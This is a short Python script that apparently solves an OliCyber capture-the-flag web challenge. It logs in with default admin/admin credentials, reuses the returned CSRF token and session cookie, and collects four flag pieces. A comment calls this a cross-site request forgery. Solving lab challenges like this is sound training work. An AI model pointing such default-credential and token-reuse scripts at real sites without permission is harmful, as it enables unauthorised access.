import requests
import json as j

url = 'http://web-11.challs.olicyber.it'
json = {
        'username' : 'admin',
        'password' : 'admin'
        }
flag = ""
for i in range (0,4):
        session = requests.Session()
        resp = session.post(url + '/login', json=json)
        resp = session.get(url + '/flag_piece?index=' + str(i) + '&csrf=' + str(j.loads(resp.text)['csrf']))
        flag += j.loads(resp.text)['flag_piece']
print(flag)
        
# We have to do a Cross Site Request Forgery, so we must obtain the csrf token and a session cookie
# First of all we send a POST request to the 'login' resource, then we do a GET request using session
# cookie and csrf token. We do this 4 times to collect all flag pieces.